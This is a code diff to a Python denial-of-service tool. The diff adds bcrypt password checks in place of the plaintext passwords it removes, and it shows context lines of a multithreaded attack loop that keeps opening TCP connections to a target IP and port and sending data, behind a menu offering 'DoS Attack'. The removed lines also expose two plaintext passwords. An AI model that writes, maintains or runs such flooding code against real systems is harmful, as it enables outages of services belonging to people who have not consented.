@@ -3,10 +3,16 @@ import random
 import threading
 import time
 import os
+import bcrypt
+from dotenv import load_dotenv  # Load environment variables
 
-# Define the password required to access the main menu
-PASSWORD = "man2314"
-PASSWORD = "callumthegamer3d"
+load_dotenv()  # Load the .env file variables
+
+# Fetch hashed passwords from environment variables
+HASHED_PASSWORD1 = os.getenv("HASHED_PASSWORD1").encode()
+HASHED_PASSWORD2 = os.getenv("HASHED_PASSWORD2").encode()
+
+HASHED_PASSWORDS = [HASHED_PASSWORD1, HASHED_PASSWORD2]
 
 def clear_screen():
     """Clears the console screen."""
@@ -51,7 +57,7 @@ def start_attack(ip, port, pack):
                 print("Target is unreachable. Waiting before retrying...")
                 time.sleep(10)
                 continue
-            
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             s.send(hh)
@@ -75,7 +81,7 @@ def attack_menu():
     time.sleep(2)
     clear_screen()
     print_banner()
-    
+
     # Start DoS attack threads
     for _ in range(thread_count):
         attack_thread = threading.Thread(target=start_attack, args=(ip, port, pack))
@@ -84,13 +90,12 @@ def attack_menu():
 def main():
     clear_screen()
     print_banner()
-
     print("Welcome to the dot dot series")
-    
+
     # Loop until the correct password is entered
     while True:
         password = input("Please enter the password to proceed: ")
-        if password == PASSWORD:
+        if any(bcrypt.checkpw(password.encode('utf-8'), hashed) for hashed in HASHED_PASSWORDS):
             print("Access granted.")
             break
         else:
@@ -101,7 +106,7 @@ def main():
         print("1) DoS Attack")
         print("2) Exit")
         choice = input("Enter your choice: ")
-        
+
         if choice == "1":
             attack_menu()
         elif choice == "2":
